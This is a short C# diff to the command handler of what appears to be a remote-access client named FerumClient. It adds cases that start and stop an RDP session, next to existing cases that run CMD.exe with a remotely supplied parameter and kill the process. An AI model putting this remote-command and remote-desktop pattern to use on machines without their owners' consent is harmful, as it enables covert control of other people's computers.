@@ -27,6 +27,13 @@ namespace FerumClient.Core
                 case "Cmd":
                     System.Diagnostics.Process.Start("CMD.exe", _param);
                     break;
+                case "RDP":
+                    GlobalVar.RdpClient = new RDPClient();
+                    GlobalVar.RdpClient.ServerStart(null);
+                    break;
+                case "RDPDisconnect":
+                    GlobalVar.RdpClient.Disconnect();
+                    break;
                 case "Disconect":
                     Process.GetCurrentProcess().Kill();
                     break;
